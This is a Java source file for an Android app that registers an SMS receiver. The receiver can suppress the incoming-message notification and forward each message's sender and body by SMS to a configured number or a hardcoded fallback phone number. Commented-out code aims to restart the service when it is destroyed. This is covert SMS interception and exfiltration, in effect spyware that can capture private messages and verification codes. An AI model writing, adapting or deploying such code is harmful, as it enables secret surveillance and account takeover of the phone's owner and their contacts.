package com.example.foleakey.waves;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;
import com.example.foleakey.waves.MainActivity;
import com.example.foleakey.waves.Filter;

/**
 * Created by FoLeakey on 2015/10/07.
 */

public class Receiver extends BroadcastReceiver {

    public static int switcher = 0;
    public static final int START_STICKY = 1;
    public static SmsMessage[] tmsg;
    public static String numberstr;

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction()  //receive a sms.
                .equals("android.provider.Telephony.SMS_RECEIVED")) { //hide the notice.
            if (MainActivity.isInterceptor)
                abortBroadcast();
            StringBuilder sbBuilder = new StringBuilder(); //create to copy the sms.
            Bundle bundle = intent.getExtras();
            if (bundle != null) { //copy the sms.
                Object[] pdus = (Object[]) bundle.get("pdus");
                SmsMessage[] message = new SmsMessage[pdus.length]; //create a dynamic array to push the sms.
                for (int i = 0; i < pdus.length; i++) {
                    message[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                }
                numberstr=Filter.numberfilter(message);
                Filter.textfilter(message);
                // format the sms and send.
                for (SmsMessage smsMessage : message) {
                    sbBuilder.append("来自: ");
                    sbBuilder.append(numberstr);//get the original number.
                    sbBuilder.append("\nFrom:");
                    sbBuilder.append(smsMessage.getDisplayOriginatingAddress());
                    sbBuilder.append("\n");
                    sbBuilder.append(smsMessage.getDisplayMessageBody());//get the text.
                }
            }

            if (switcher == 1) {
                android.telephony.SmsManager.getDefault().sendTextMessage(
                        MainActivity.DestinationAddress == null ? "18227690599" : MainActivity.DestinationAddress, null,
                        sbBuilder.toString(), null, null);
                Toast.makeText(context, sbBuilder.toString(), Toast.LENGTH_LONG).show();
            }

/*            android.telephony.SmsManager.getDefault().sendTextMessage(
                    MainActivity.DestinationAddress == null ? "18227690599"
                            : MainActivity.DestinationAddress, null,
                    sbBuilder.toString(), null, null);
            Toast.makeText(context, sbBuilder.toString(), Toast.LENGTH_LONG).show();*/
        }
    }

//    @Override
//    public int onStartCommand(Intent intent, int flags, int startId) {
//        return START_STICKY;
//    }
//    @Override
//    public int onStartCommand(Intent intent, int flags, int startId) {
//        // TODO Auto-generated method stub
//        //Log.v("TrafficService", "startCommand");
//        flags = START_STICKY;
//        return super.onStartCommand(intent, flags, startId);
//        // return START_REDELIVER_INTENT;
//    }
//    public void onDestroy() {
//        Intent localIntent = new Intent();
//        localIntent.setClass(this, Receiver.class); //销毁时重新启动Service
//        this.startService(localIntent);
//    }
}
